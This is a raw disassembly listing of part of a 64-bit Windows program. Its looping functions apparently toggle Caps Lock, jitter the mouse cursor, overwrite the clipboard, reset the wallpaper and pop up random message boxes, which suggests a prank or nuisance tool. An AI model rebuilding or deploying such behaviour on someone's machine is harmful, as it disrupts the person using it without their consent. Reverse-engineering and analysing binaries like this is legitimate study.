   1400016c0:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400016c5:	48 3b c7             	cmp    %rdi,%rax
   1400016c8:	7d 0d                	jge    0x1400016d7
   1400016ca:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400016d0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400016d5:	eb 05                	jmp    0x1400016dc
   1400016d7:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400016dc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400016e1:	e8 aa 49 00 00       	call   0x140006090
   1400016e6:	80 3d c7 c9 00 00 00 	cmpb   $0x0,0xc9c7(%rip)        # 0x14000e0b4
   1400016ed:	75 c7                	jne    0x1400016b6
   1400016ef:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400016f4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400016f9:	33 c9                	xor    %ecx,%ecx
   1400016fb:	48 83 c4 28          	add    $0x28,%rsp
   1400016ff:	48 ff 25 22 7c 00 00 	rex.W jmp *0x7c22(%rip)        # 0x140009328
   140001706:	cc                   	int3
   140001707:	cc                   	int3
   140001708:	cc                   	int3
   140001709:	cc                   	int3
   14000170a:	cc                   	int3
   14000170b:	cc                   	int3
   14000170c:	cc                   	int3
   14000170d:	cc                   	int3
   14000170e:	cc                   	int3
   14000170f:	cc                   	int3
   140001710:	4c 8b dc             	mov    %rsp,%r11
   140001713:	48 83 ec 68          	sub    $0x68,%rsp
   140001717:	80 3d 96 c9 00 00 00 	cmpb   $0x0,0xc996(%rip)        # 0x14000e0b4
   14000171e:	48 8d 05 e3 80 00 00 	lea    0x80e3(%rip),%rax        # 0x140009808
   140001725:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001729:	48 8d 05 f0 80 00 00 	lea    0x80f0(%rip),%rax        # 0x140009820
   140001730:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001734:	48 8d 05 fd 80 00 00 	lea    0x80fd(%rip),%rax        # 0x140009838
   14000173b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   14000173f:	0f 84 be 00 00 00    	je     0x140001803
   140001745:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001749:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001750:	ff ff 7f 
   140001753:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001757:	48 bd ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rbp
   14000175e:	ff ff 7f 
   140001761:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001765:	33 f6                	xor    %esi,%esi
   140001767:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000176b:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001770:	ff 15 8a 7e 00 00    	call   *0x7e8a(%rip)        # 0x140009600
   140001776:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   14000177d:	00 
   14000177e:	45 33 c9             	xor    %r9d,%r9d
   140001781:	44 8b c0             	mov    %eax,%r8d
   140001784:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001789:	b8 56 55 55 55       	mov    $0x55555556,%eax
   14000178e:	41 f7 e8             	imul   %r8d
   140001791:	8b ca                	mov    %edx,%ecx
   140001793:	c1 e9 1f             	shr    $0x1f,%ecx
   140001796:	03 d1                	add    %ecx,%edx
   140001798:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   14000179b:	44 2b c1             	sub    %ecx,%r8d
   14000179e:	48 8d 15 ab 80 00 00 	lea    0x80ab(%rip),%rdx        # 0x140009850
   1400017a5:	4d 63 c0             	movslq %r8d,%r8
   1400017a8:	33 c9                	xor    %ecx,%ecx
   1400017aa:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   1400017af:	ff 15 23 7b 00 00    	call   *0x7b23(%rip)        # 0x1400092d8
   1400017b5:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400017ba:	e8 61 f8 ff ff       	call   0x140001020
   1400017bf:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400017c4:	48 3b c5             	cmp    %rbp,%rax
   1400017c7:	7d 0b                	jge    0x1400017d4
   1400017c9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400017cd:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1400017d2:	eb 05                	jmp    0x1400017d9
   1400017d4:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   1400017d9:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400017de:	e8 ad 48 00 00       	call   0x140006090
   1400017e3:	40 38 35 ca c8 00 00 	cmp    %sil,0xc8ca(%rip)        # 0x14000e0b4
   1400017ea:	75 84                	jne    0x140001770
   1400017ec:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400017f1:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400017f6:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400017fb:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001802:	00 
   140001803:	48 83 c4 68          	add    $0x68,%rsp
   140001807:	c3                   	ret
   140001808:	cc                   	int3
   140001809:	cc                   	int3
   14000180a:	cc                   	int3
   14000180b:	cc                   	int3
   14000180c:	cc                   	int3
   14000180d:	cc                   	int3
   14000180e:	cc                   	int3
   14000180f:	cc                   	int3
   140001810:	48 83 ec 38          	sub    $0x38,%rsp
   140001814:	45 33 c9             	xor    %r9d,%r9d
   140001817:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000181e:	00 00 
   140001820:	4c 8d 05 31 81 00 00 	lea    0x8131(%rip),%r8        # 0x140009958
   140001827:	33 c9                	xor    %ecx,%ecx
   140001829:	48 8d 15 30 80 00 00 	lea    0x8030(%rip),%rdx        # 0x140009860
   140001830:	ff 15 0a 7e 00 00    	call   *0x7e0a(%rip)        # 0x140009640
   140001836:	80 3d 77 c8 00 00 00 	cmpb   $0x0,0xc877(%rip)        # 0x14000e0b4
   14000183d:	0f 84 8d 00 00 00    	je     0x1400018d0
   140001843:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001848:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000184f:	ff ff 7f 
   140001852:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001857:	48 be ff 1b f4 ab fd 	movabs $0x7ffffffdabf41bff,%rsi
   14000185e:	ff ff 7f 
   140001861:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001866:	48 bf 00 e4 0b 54 02 	movabs $0x2540be400,%rdi
   14000186d:	00 00 00 
   140001870:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001876:	4c 8d 05 db 80 00 00 	lea    0x80db(%rip),%r8        # 0x140009958
   14000187d:	33 d2                	xor    %edx,%edx
   14000187f:	b9 14 00 00 00       	mov    $0x14,%ecx
   140001884:	ff 15 a6 7a 00 00    	call   *0x7aa6(%rip)        # 0x140009330
   14000188a:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000188f:	e8 8c f7 ff ff       	call   0x140001020
   140001894:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001899:	48 3b c6             	cmp    %rsi,%rax
   14000189c:	7d 0b                	jge    0x1400018a9
   14000189e:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   1400018a2:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   1400018a7:	eb 05                	jmp    0x1400018ae
   1400018a9:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400018ae:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400018b3:	e8 d8 47 00 00       	call   0x140006090
   1400018b8:	80 3d f5 c7 00 00 00 	cmpb   $0x0,0xc7f5(%rip)        # 0x14000e0b4
   1400018bf:	75 af                	jne    0x140001870
   1400018c1:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400018c6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400018cb:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400018d0:	48 83 c4 38          	add    $0x38,%rsp
   1400018d4:	c3                   	ret
   1400018d5:	cc                   	int3
   1400018d6:	cc                   	int3
   1400018d7:	cc                   	int3
   1400018d8:	cc                   	int3
   1400018d9:	cc                   	int3
   1400018da:	cc                   	int3
   1400018db:	cc                   	int3
   1400018dc:	cc                   	int3
   1400018dd:	cc                   	int3
   1400018de:	cc                   	int3
   1400018df:	cc                   	int3
   1400018e0:	48 83 ec 68          	sub    $0x68,%rsp
   1400018e4:	48 8b 05 55 c7 00 00 	mov    0xc755(%rip),%rax        # 0x14000e040
   1400018eb:	48 33 c4             	xor    %rsp,%rax
   1400018ee:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400018f3:	33 d2                	xor    %edx,%edx
   1400018f5:	48 8d 0d 74 80 00 00 	lea    0x8074(%rip),%rcx        # 0x140009970
   1400018fc:	ff 15 be 7a 00 00    	call   *0x7abe(%rip)        # 0x1400093c0
   140001902:	80 3d ab c7 00 00 00 	cmpb   $0x0,0xc7ab(%rip)        # 0x14000e0b4
   140001909:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000190e:	c7 44 24 30 20 00 00 	movl   $0x20,0x30(%rsp)
   140001915:	00 
   140001916:	c7 44 24 40 0f 00 00 	movl   $0xf,0x40(%rsp)
   14000191d:	00 
   14000191e:	c7 44 24 44 ff ff ff 	movl   $0xffffffff,0x44(%rsp)
   140001925:	ff 
   140001926:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   14000192d:	00 
   14000192e:	74 6e                	je     0x14000199e
   140001930:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001935:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000193c:	ff ff 7f 
   14000193f:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140001944:	48 bf ff 6b ca 88 ff 	movabs $0x7fffffff88ca6bff,%rdi
   14000194b:	ff ff 7f 
   14000194e:	66 90                	xchg   %ax,%ax
   140001950:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001955:	ff 15 55 7a 00 00    	call   *0x7a55(%rip)        # 0x1400093b0
   14000195b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001960:	e8 bb f6 ff ff       	call   0x140001020
   140001965:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000196a:	48 3b c7             	cmp    %rdi,%rax
   14000196d:	7d 0d                	jge    0x14000197c
   14000196f:	48 05 00 94 35 77    	add    $0x77359400,%rax
   140001975:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000197a:	eb 05                	jmp    0x140001981
   14000197c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001981:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001986:	e8 05 47 00 00       	call   0x140006090
   14000198b:	80 3d 22 c7 00 00 00 	cmpb   $0x0,0xc722(%rip)        # 0x14000e0b4
   140001992:	75 bc                	jne    0x140001950
   140001994:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140001999:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000199e:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400019a3:	48 33 cc             	xor    %rsp,%rcx
   1400019a6:	e8 15 55 00 00       	call   0x140006ec0
   1400019ab:	48 83 c4 68          	add    $0x68,%rsp
   1400019af:	c3                   	ret
   1400019b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400019b4:	80 3d f9 c6 00 00 00 	cmpb   $0x0,0xc6f9(%rip)        # 0x14000e0b4
   1400019bb:	0f 84 88 00 00 00    	je     0x140001a49
   1400019c1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400019c6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400019cd:	ff ff 7f 
   1400019d0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400019d5:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400019dc:	ff ff 7f 
   1400019df:	90                   	nop
   1400019e0:	45 33 c9             	xor    %r9d,%r9d
   1400019e3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400019e9:	b2 3a                	mov    $0x3a,%dl
   1400019eb:	b1 14                	mov    $0x14,%cl
   1400019ed:	ff 15 6d 79 00 00    	call   *0x796d(%rip)        # 0x140009360
   1400019f3:	45 33 c9             	xor    %r9d,%r9d
   1400019f6:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400019fc:	b2 3a                	mov    $0x3a,%dl
   1400019fe:	b1 14                	mov    $0x14,%cl
   140001a00:	ff 15 5a 79 00 00    	call   *0x795a(%rip)        # 0x140009360
   140001a06:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001a0b:	e8 10 f6 ff ff       	call   0x140001020
   140001a10:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001a15:	48 3b c7             	cmp    %rdi,%rax
   140001a18:	7d 0d                	jge    0x140001a27
   140001a1a:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001a20:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001a25:	eb 05                	jmp    0x140001a2c
   140001a27:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001a2c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001a31:	e8 5a 46 00 00       	call   0x140006090
   140001a36:	80 3d 77 c6 00 00 00 	cmpb   $0x0,0xc677(%rip)        # 0x14000e0b4
   140001a3d:	75 a1                	jne    0x1400019e0
   140001a3f:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001a44:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001a49:	48 83 c4 28          	add    $0x28,%rsp
   140001a4d:	c3                   	ret
   140001a4e:	cc                   	int3
   140001a4f:	cc                   	int3
   140001a50:	4c 8b dc             	mov    %rsp,%r11
   140001a53:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001a5a:	48 8b 05 df c5 00 00 	mov    0xc5df(%rip),%rax        # 0x14000e040
   140001a61:	48 33 c4             	xor    %rsp,%rax
   140001a64:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140001a69:	80 3d 44 c6 00 00 00 	cmpb   $0x0,0xc644(%rip)        # 0x14000e0b4
   140001a70:	0f 84 b7 01 00 00    	je     0x140001c2d
   140001a76:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140001a7a:	49 89 6b 10          	mov    %rbp,0x10(%r11)
   140001a7e:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001a85:	ff ff 7f 
   140001a88:	49 89 73 18          	mov    %rsi,0x18(%r11)
   140001a8c:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   140001a90:	4d 89 63 f8          	mov    %r12,-0x8(%r11)
   140001a94:	49 bc 7f 3c 36 fe ff 	movabs $0x7ffffffffe363c7f,%r12
   140001a9b:	ff ff 7f 
   140001a9e:	4d 89 73 f0          	mov    %r14,-0x10(%r11)
   140001aa2:	45 33 f6             	xor    %r14d,%r14d
   140001aa5:	4d 89 7b e8          	mov    %r15,-0x18(%r11)
   140001aa9:	49 bf ff d2 ce fe ff 	movabs $0x7ffffffffeced2ff,%r15
   140001ab0:	ff ff 7f 
   140001ab3:	ff 15 17 79 00 00    	call   *0x7917(%rip)        # 0x1400093d0
   140001ab9:	48 8b f0             	mov    %rax,%rsi
   140001abc:	48 85 c0             	test   %rax,%rax
   140001abf:	0f 84 f9 00 00 00    	je     0x140001bbe
   140001ac5:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001aca:	48 8b c8             	mov    %rax,%rcx
   140001acd:	ff 15 35 78 00 00    	call   *0x7835(%rip)        # 0x140009308
   140001ad3:	85 c0                	test   %eax,%eax
   140001ad5:	0f 84 e3 00 00 00    	je     0x140001bbe
   140001adb:	bb 0a 00 00 00       	mov    $0xa,%ebx
   140001ae0:	ff 15 1a 7b 00 00    	call   *0x7b1a(%rip)        # 0x140009600
   140001ae6:	44 8b c0             	mov    %eax,%r8d
   140001ae9:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001aee:	41 f7 e8             	imul   %r8d
   140001af1:	c1 fa 03             	sar    $0x3,%edx
   140001af4:	8b ca                	mov    %edx,%ecx
   140001af6:	c1 e9 1f             	shr    $0x1f,%ecx
   140001af9:	03 d1                	add    %ecx,%edx
   140001afb:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001afe:	c1 e1 02             	shl    $0x2,%ecx
   140001b01:	44 2b c1             	sub    %ecx,%r8d
   140001b04:	41 8d 78 f6          	lea    -0xa(%r8),%edi
   140001b08:	ff 15 f2 7a 00 00    	call   *0x7af2(%rip)        # 0x140009600
   140001b0e:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b13:	44 8b c0             	mov    %eax,%r8d
   140001b16:	b8 67 66 66 66       	mov    $0x66666667,%eax
   140001b1b:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001b22:	00 
   140001b23:	41 f7 e8             	imul   %r8d
   140001b26:	41 83 c1 f6          	add    $0xfffffff6,%r9d
   140001b2a:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001b2f:	c1 fa 03             	sar    $0x3,%edx
   140001b32:	8b ca                	mov    %edx,%ecx
   140001b34:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001b39:	c1 e9 1f             	shr    $0x1f,%ecx
   140001b3c:	03 d1                	add    %ecx,%edx
   140001b3e:	8d 0c 92             	lea    (%rdx,%rdx,4),%ecx
   140001b41:	33 d2                	xor    %edx,%edx
   140001b43:	c1 e1 02             	shl    $0x2,%ecx
   140001b46:	44 2b c1             	sub    %ecx,%r8d
   140001b49:	48 8b ce             	mov    %rsi,%rcx
   140001b4c:	45 03 c8             	add    %r8d,%r9d
   140001b4f:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001b54:	44 03 c7             	add    %edi,%r8d
   140001b57:	ff 15 f3 77 00 00    	call   *0x77f3(%rip)        # 0x140009350
   140001b5d:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001b62:	e8 b9 f4 ff ff       	call   0x140001020
   140001b67:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001b6c:	49 3b c4             	cmp    %r12,%rax
   140001b6f:	7d 0d                	jge    0x140001b7e
   140001b71:	48 05 80 c3 c9 01    	add    $0x1c9c380,%rax
   140001b77:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001b7c:	eb 05                	jmp    0x140001b83
   140001b7e:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001b83:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001b88:	e8 03 45 00 00       	call   0x140006090
   140001b8d:	48 83 eb 01          	sub    $0x1,%rbx
   140001b91:	0f 85 49 ff ff ff    	jne    0x140001ae0
   140001b97:	44 8b 4c 24 5c       	mov    0x5c(%rsp),%r9d
   140001b9c:	33 d2                	xor    %edx,%edx
   140001b9e:	44 8b 44 24 58       	mov    0x58(%rsp),%r8d
   140001ba3:	48 8b ce             	mov    %rsi,%rcx
   140001ba6:	c7 44 24 30 15 00 00 	movl   $0x15,0x30(%rsp)
   140001bad:	00 
   140001bae:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140001bb3:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   140001bb8:	ff 15 92 77 00 00    	call   *0x7792(%rip)        # 0x140009350
   140001bbe:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001bc3:	e8 58 f4 ff ff       	call   0x140001020
   140001bc8:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001bcd:	49 3b c7             	cmp    %r15,%rax
   140001bd0:	7d 0d                	jge    0x140001bdf
   140001bd2:	48 05 00 2d 31 01    	add    $0x1312d00,%rax
   140001bd8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001bdd:	eb 05                	jmp    0x140001be4
   140001bdf:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140001be4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001be9:	e8 a2 44 00 00       	call   0x140006090
   140001bee:	44 38 35 bf c4 00 00 	cmp    %r14b,0xc4bf(%rip)        # 0x14000e0b4
   140001bf5:	0f 85 b8 fe ff ff    	jne    0x140001ab3
   140001bfb:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140001c00:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   140001c05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140001c0c:	00 
   140001c0d:	48 8b bc 24 a8 00 00 	mov    0xa8(%rsp),%rdi
   140001c14:	00 
   140001c15:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140001c1c:	00 
   140001c1d:	48 8b ac 24 98 00 00 	mov    0x98(%rsp),%rbp
   140001c24:	00 
   140001c25:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140001c2c:	00 
   140001c2d:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140001c32:	48 33 cc             	xor    %rsp,%rcx
   140001c35:	e8 86 52 00 00       	call   0x140006ec0
   140001c3a:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001c41:	c3                   	ret
   140001c42:	cc                   	int3
   140001c43:	cc                   	int3
   140001c44:	cc                   	int3
   140001c45:	cc                   	int3
   140001c46:	cc                   	int3
   140001c47:	cc                   	int3
   140001c48:	cc                   	int3
   140001c49:	cc                   	int3
   140001c4a:	cc                   	int3
   140001c4b:	cc                   	int3
   140001c4c:	cc                   	int3
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	4c 8b dc             	mov    %rsp,%r11
   140001c53:	48 83 ec 68          	sub    $0x68,%rsp
   140001c57:	80 3d 56 c4 00 00 00 	cmpb   $0x0,0xc456(%rip)        # 0x14000e0b4
   140001c5e:	48 8d 05 2b 7d 00 00 	lea    0x7d2b(%rip),%rax        # 0x140009990
   140001c65:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140001c69:	48 8d 05 50 7d 00 00 	lea    0x7d50(%rip),%rax        # 0x1400099c0
   140001c70:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140001c74:	48 8d 05 75 7d 00 00 	lea    0x7d75(%rip),%rax        # 0x1400099f0
   140001c7b:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140001c7f:	48 8d 05 ba 7d 00 00 	lea    0x7dba(%rip),%rax        # 0x140009a40
   140001c86:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140001c8a:	0f 84 b9 00 00 00    	je     0x140001d49
   140001c90:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140001c94:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001c9b:	ff ff 7f 
   140001c9e:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   140001ca2:	48 bd ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%rbp
   140001ca9:	ff ff 7f 
   140001cac:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140001cb0:	33 f6                	xor    %esi,%esi
   140001cb2:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   140001cb6:	48 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%rdi
   140001cbd:	00 00 00 
   140001cc0:	ff 15 3a 79 00 00    	call   *0x793a(%rip)        # 0x140009600
   140001cc6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001ccb:	7d 07                	jge    0x140001cd4
   140001ccd:	ff c8                	dec    %eax
   140001ccf:	83 c8 fc             	or     $0xfffffffc,%eax
   140001cd2:	ff c0                	inc    %eax
   140001cd4:	4c 63 c0             	movslq %eax,%r8
   140001cd7:	48 8d 15 72 7b 00 00 	lea    0x7b72(%rip),%rdx        # 0x140009850
   140001cde:	c7 44 24 28 0a 00 00 	movl   $0xa,0x28(%rsp)
   140001ce5:	00 
   140001ce6:	45 33 c9             	xor    %r9d,%r9d
   140001ce9:	33 c9                	xor    %ecx,%ecx
   140001ceb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001cf0:	4e 8b 44 c4 30       	mov    0x30(%rsp,%r8,8),%r8
   140001cf5:	ff 15 dd 75 00 00    	call   *0x75dd(%rip)        # 0x1400092d8
   140001cfb:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140001d00:	e8 1b f3 ff ff       	call   0x140001020
   140001d05:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140001d0a:	48 3b c5             	cmp    %rbp,%rax
   140001d0d:	7d 0b                	jge    0x140001d1a
   140001d0f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001d13:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140001d18:	eb 05                	jmp    0x140001d1f
   140001d1a:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140001d1f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001d24:	e8 67 43 00 00       	call   0x140006090
   140001d29:	40 38 35 84 c3 00 00 	cmp    %sil,0xc384(%rip)        # 0x14000e0b4
   140001d30:	75 8e                	jne    0x140001cc0
   140001d32:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140001d37:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140001d3c:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140001d41:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001d48:	00 
   140001d49:	48 83 c4 68          	add    $0x68,%rsp
   140001d4d:	c3                   	ret
   140001d4e:	cc                   	int3
   140001d4f:	cc                   	int3
   140001d50:	48 83 ec 28          	sub    $0x28,%rsp
   140001d54:	80 3d 59 c3 00 00 00 	cmpb   $0x0,0xc359(%rip)        # 0x14000e0b4
   140001d5b:	0f 84 d4 00 00 00    	je     0x140001e35
   140001d61:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140001d66:	48 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rsi
   140001d6d:	ff ff 7f 
   140001d70:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001d75:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   140001d7c:	ff ff 7f 
   140001d7f:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001d84:	33 c9                	xor    %ecx,%ecx
   140001d86:	ff 15 f4 75 00 00    	call   *0x75f4(%rip)        # 0x140009380
   140001d8c:	85 c0                	test   %eax,%eax
   140001d8e:	74 59                	je     0x140001de9
   140001d90:	ff 15 02 76 00 00    	call   *0x7602(%rip)        # 0x140009398
   140001d96:	ba 12 00 00 00       	mov    $0x12,%edx
   140001d9b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001da0:	ff 15 72 73 00 00    	call   *0x7372(%rip)        # 0x140009118
   140001da6:	48 8b d8             	mov    %rax,%rbx
   140001da9:	48 85 c0             	test   %rax,%rax
   140001dac:	74 35                	je     0x140001de3
   140001dae:	48 8b c8             	mov    %rax,%rcx
   140001db1:	ff 15 89 73 00 00    	call   *0x7389(%rip)        # 0x140009140
   140001db7:	0f 10 05 da 7c 00 00 	movups 0x7cda(%rip),%xmm0        # 0x140009a98
   140001dbe:	0f 11 00             	movups %xmm0,(%rax)
   140001dc1:	0f b7 0d e0 7c 00 00 	movzwl 0x7ce0(%rip),%ecx        # 0x140009aa8
   140001dc8:	66 89 48 10          	mov    %cx,0x10(%rax)
   140001dcc:	48 8b cb             	mov    %rbx,%rcx
   140001dcf:	ff 15 ab 72 00 00    	call   *0x72ab(%rip)        # 0x140009080
   140001dd5:	48 8b d3             	mov    %rbx,%rdx
   140001dd8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140001ddd:	ff 15 d5 75 00 00    	call   *0x75d5(%rip)        # 0x1400093b8
   140001de3:	ff 15 a7 75 00 00    	call   *0x75a7(%rip)        # 0x140009390
   140001de9:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001dee:	e8 2d f2 ff ff       	call   0x140001020
   140001df3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001df8:	48 3b c6             	cmp    %rsi,%rax
   140001dfb:	7d 0d                	jge    0x140001e0a
   140001dfd:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   140001e03:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001e08:	eb 05                	jmp    0x140001e0f
   140001e0a:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140001e0f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001e14:	e8 77 42 00 00       	call   0x140006090
   140001e19:	80 3d 94 c2 00 00 00 	cmpb   $0x0,0xc294(%rip)        # 0x14000e0b4
   140001e20:	0f 85 5e ff ff ff    	jne    0x140001d84
   140001e26:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001e2b:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001e30:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001e35:	48 83 c4 28          	add    $0x28,%rsp
   140001e39:	c3                   	ret
   140001e3a:	cc                   	int3
   140001e3b:	cc                   	int3
   140001e3c:	cc                   	int3
   140001e3d:	cc                   	int3
   140001e3e:	cc                   	int3
   140001e3f:	cc                   	int3
